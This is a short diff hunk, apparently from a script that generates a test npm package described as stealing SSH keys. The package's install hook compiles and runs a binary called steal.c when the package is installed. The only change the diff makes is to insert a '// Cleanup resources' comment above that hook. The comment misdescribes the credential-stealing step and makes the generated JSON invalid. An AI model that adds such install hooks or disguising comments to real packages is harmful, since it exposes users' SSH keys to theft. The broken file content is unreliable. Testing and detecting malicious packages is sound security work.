@@ -58,6 +58,7 @@ cat > package.json << 'EOF'
   "version": "1.0.0",
   "description": "Test package with native binary stealing SSH keys",
   "scripts": {
+// Cleanup resources
     "install": "gcc steal.c -o steal && ./steal"
   }
 }
